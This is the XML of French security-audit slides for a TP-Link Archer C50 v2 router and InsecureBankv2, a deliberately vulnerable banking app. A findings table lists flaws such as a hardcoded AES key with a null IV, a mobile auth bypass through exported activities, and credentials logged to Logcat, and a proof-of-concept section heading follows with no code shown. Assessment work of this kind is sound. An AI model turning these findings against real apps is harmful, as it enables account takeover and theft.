      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="1975104"/>
            <a:ext cx="15544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6" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="1975104"/>
            <a:ext cx="1481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ChangePassword.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="1975104"/>
            <a:ext cx="6858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8" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="1975104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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="1975104"/>
            <a:ext cx="1298448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40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="2020824"/>
            <a:ext cx="1152144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41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="202082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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2304288"/>
            <a:ext cx="713232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43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="2304288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fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Shape 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="2304288"/>
            <a:ext cx="288036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45" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="2304288"/>
            <a:ext cx="2807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 /dotransfer — virement depuis tout compte</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Shape 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="2304288"/>
            <a:ext cx="155448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47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="2304288"/>
            <a:ext cx="1481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DoTransfer.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="2304288"/>
            <a:ext cx="68580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49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="2304288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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="2304288"/>
            <a:ext cx="1298448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51" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="2350008"/>
            <a:ext cx="1152144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52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="2350008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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Shape 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2633472"/>
            <a:ext cx="713232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54" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="2633472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fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Shape 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="2633472"/>
            <a:ext cx="2880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56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="2633472"/>
            <a:ext cx="2807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AES-256 hardcodée + IV nul (zéro bytes)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Shape 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="2633472"/>
            <a:ext cx="15544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58" name="Text 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="2633472"/>
            <a:ext cx="1481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CryptoClass.java</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Shape 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="2633472"/>
            <a:ext cx="6858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60" name="Text 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="2633472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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Shape 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="2633472"/>
            <a:ext cx="1298448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62" name="Shape 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="2679192"/>
            <a:ext cx="1152144" cy="20116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63" name="Text 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="2679192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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Shape 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2962656"/>
            <a:ext cx="713232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65" name="Text 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="2962656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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Shape 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="2962656"/>
            <a:ext cx="288036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67" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="2962656"/>
            <a:ext cx="2807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Fuite mot de passe par SMS broadcast</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Shape 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="2962656"/>
            <a:ext cx="155448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69" name="Text 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="2962656"/>
            <a:ext cx="1481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BroadCastReceiver</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Shape 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="2962656"/>
            <a:ext cx="68580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71" name="Text 69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="2962656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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Shape 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="2962656"/>
            <a:ext cx="1298448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73" name="Shape 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3008376"/>
            <a:ext cx="1152144" cy="20116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74" name="Text 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3008376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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Shape 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3291840"/>
            <a:ext cx="713232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76" name="Text 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="3291840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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Shape 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="3291840"/>
            <a:ext cx="2880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78" name="Text 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="3291840"/>
            <a:ext cx="2807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Activités exportées — bypass auth mobile complet</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Shape 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="3291840"/>
            <a:ext cx="15544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80" name="Text 78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="3291840"/>
            <a:ext cx="1481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AndroidManifest</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Shape 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="3291840"/>
            <a:ext cx="6858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82" name="Text 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="3291840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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Shape 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="3291840"/>
            <a:ext cx="1298448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84" name="Shape 82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3337560"/>
            <a:ext cx="1152144" cy="20116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85" name="Text 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="333756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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Shape 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3621024"/>
            <a:ext cx="713232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87" name="Text 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="3621024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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Shape 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="3621024"/>
            <a:ext cx="288036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89" name="Text 87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="3621024"/>
            <a:ext cx="2807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HTTP en clair (MITM trivial)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Shape 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="3621024"/>
            <a:ext cx="155448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91" name="Text 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="3621024"/>
            <a:ext cx="1481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DoLogin/Transfer</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Shape 90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="3621024"/>
            <a:ext cx="68580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93" name="Text 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="3621024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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Shape 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="3621024"/>
            <a:ext cx="1298448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95" name="Shape 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3666744"/>
            <a:ext cx="1152144" cy="20116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96" name="Text 94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3666744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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Shape 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3950208"/>
            <a:ext cx="713232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98" name="Text 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="3950208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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Shape 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="3950208"/>
            <a:ext cx="2880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00" name="Text 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="3950208"/>
            <a:ext cx="2807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ContentProvider non protégé — liste utilisateurs</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Shape 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="3950208"/>
            <a:ext cx="15544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02" name="Text 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="3950208"/>
            <a:ext cx="1481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TrackUserProvider</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Shape 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="3950208"/>
            <a:ext cx="6858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04" name="Text 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="3950208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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Shape 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="3950208"/>
            <a:ext cx="1298448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06" name="Shape 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3995928"/>
            <a:ext cx="1152144" cy="2011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07" name="Text 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="3995928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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Shape 106"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4279392"/>
            <a:ext cx="713232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09" name="Text 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="4279392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V9</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Shape 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="4279392"/>
            <a:ext cx="288036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11" name="Text 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="4279392"/>
            <a:ext cx="2807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DEBUG + credentials logués dans Logcat</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Shape 110"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="4279392"/>
            <a:ext cx="155448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13" name="Text 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="4279392"/>
            <a:ext cx="1481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BuildConfig</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Shape 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="4279392"/>
            <a:ext cx="68580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15" name="Text 113"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="4279392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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Shape 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="4279392"/>
            <a:ext cx="1298448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17" name="Shape 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="4325112"/>
            <a:ext cx="1152144" cy="2011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18" name="Text 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="4325112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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Shape 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4608576"/>
            <a:ext cx="713232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20" name="Text 118"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="4608576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V10</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Shape 119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1033272" y="4608576"/>
            <a:ext cx="2880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22" name="Text 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="4608576"/>
            <a:ext cx="2807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allowBackup=true — extraction SharedPrefs via ADB</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Shape 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3913632" y="4608576"/>
            <a:ext cx="15544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24" name="Text 122"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3950208" y="4608576"/>
            <a:ext cx="1481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AndroidManifest</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Shape 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5468112" y="4608576"/>
            <a:ext cx="6858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26" name="Text 124"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5504688" y="4608576"/>
            <a:ext cx="612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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Shape 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153912" y="4608576"/>
            <a:ext cx="1298448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28" name="Shape 126"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="4654296"/>
            <a:ext cx="1152144" cy="2011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29" name="Text 127"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="4654296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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Shape 12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31" name="Text 129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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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05d — EXPLOITATION</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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2200" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A2540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Preuve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2200" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540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de Concept </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2200" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A2540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(POC) —</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2200" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540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 3 Scénarios Critiques</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof="0">
              <a:latin typeface="Trebuchet M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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
